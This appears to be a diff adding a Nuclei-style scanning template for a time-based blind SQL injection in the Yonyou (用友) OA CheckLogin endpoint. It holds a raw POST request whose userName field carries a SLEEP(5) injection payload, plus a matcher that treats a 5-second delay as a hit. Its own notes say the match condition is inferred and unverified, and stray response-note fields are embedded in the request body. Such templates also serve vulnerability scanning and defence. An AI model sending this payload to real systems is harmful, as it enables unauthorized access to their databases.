@@ -1,0 +1,45 @@
+id: poc-svisww0wcfy9mog7
+info:
+  name: 用友 OA CheckLogin 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/svisww0wcfy9mog7
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: svisww0wcfy9mog7
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /yyoa/CheckLogin HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    userName=11'' AND (SELECT 6355 FROM (SELECT(SLEEP(5)))sHcE) AND ''wert''=''wert&loginit12=&password=
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    登录名错误
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
